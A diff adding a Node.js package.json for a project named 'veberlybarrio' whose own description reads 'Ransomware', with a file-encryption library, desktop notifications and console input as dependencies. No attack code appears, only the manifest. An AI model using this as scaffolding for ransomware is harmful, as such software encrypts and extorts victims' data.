@@ -1,0 +1,16 @@
+{
+  "dependencies": {
+    "file-encryptor": "^0.1.1",
+    "node-notifier": "^10.0.1",
+    "readline-sync": "^1.4.10"
+  },
+  "name": "veberlybarrio",
+  "version": "1.0.0",
+  "description": "Ransomware",
+  "main": "bulate.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC"
+}
